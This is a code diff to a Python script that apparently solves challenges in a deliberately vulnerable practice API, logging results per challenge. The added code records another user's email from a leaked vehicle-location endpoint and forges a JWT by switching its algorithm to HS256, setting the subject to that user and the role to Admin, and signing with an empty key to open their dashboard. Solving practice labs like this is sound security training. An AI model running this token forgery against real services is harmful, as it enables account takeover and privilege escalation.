@@ -1,4 +1,5 @@
 import argparse
+import base64
 import json
 from typing import Dict, Optional
 import requests
@@ -6,6 +7,8 @@ import re
 import logging
 from rich.console import Console
 from rich.table import Table
+import jwt.algorithms
+import jwt
 
 # Global variables
 ip_address = ""
@@ -457,6 +460,18 @@ def extract_ip_address(html: str) -> Optional[str]:
     return ip_address
 
 
+def login_with_token(token, email) -> requests.Response:
+    url = f"http://{ip_address}:{web_port}/identity/api/auth/v4.0/user/login-with-token"
+    headers = {
+        "email": email,
+        "token": token
+    }
+    response = requests.post(url, headers=headers)
+    if response.status_code != 200:
+        logging.error(f"Failed to login with token: {
+            response.status_code} - {response.text}")
+
+
 def main():
     global ip_address, web_port, mail_port
     parser = argparse.ArgumentParser(
@@ -515,6 +530,7 @@ def main():
     # ##############
     response = read_recent_posts(nico_token)
     email_vehicleid = parse_recent_posts_response(response)
+    other_user = ""
 
     logging.debug("Email VehicleID:", email_vehicleid)
 
@@ -523,6 +539,7 @@ def main():
         if response.status_code == 200:
             logging.info(f"Location for user {email}: {
                 response.json()['vehicleLocation']}")
+            other_user = email
             results["ch1"]["status"] = "passed"
             results["ch1"]["message"] = f"Location for user {
                 email}: {response.json()['vehicleLocation']}"
@@ -820,6 +837,45 @@ def main():
                 len(unauthenticated_operations)}. QR code read successfully"
     else:
         logging.error(f"Failed to get unauthenticated operations: {
+            response.status_code} {response.text}")
+
+    # ###############
+    # CHALLENGE 15
+    # ###############
+    # Decode a JWT token
+    print(nico_token)
+    header, payload, signature = nico_token.split('.')
+    # Decode the header and payload
+    header_decoded = base64.urlsafe_b64decode(header + "==").decode('utf-8')
+    payload_decoded = base64.urlsafe_b64decode(payload + "==").decode('utf-8')
+    print("Header:", header_decoded)
+    print("Payload:", payload_decoded)
+
+    # Forge a new token
+
+    header_dict = json.loads(header_decoded)
+    header_dict["alg"] = "HS256"
+
+    payload_dict = json.loads(payload_decoded)
+    payload_dict["sub"] = other_user
+    payload_dict["role"] = "Admin"
+
+    secret_key = ''
+
+    new_token = jwt.encode(payload_dict, secret_key,
+                           algorithm="HS256", headers=header_dict)
+
+    print("New token:", new_token)
+
+    response = get_user_dashboard(new_token)
+    if response.status_code == 200:
+        logging.info(f"JWT vulnerabilities challenge 15: {
+            response.json()}")
+        results["ch15"]["status"] = "passed"
+        results["ch15"]["message"] = f"Accessed other user's dashboard: {
+            response.json()}"
+    else:
+        logging.error(f"Failed to get user dashboard: {
             response.status_code} {response.text}")
 
 
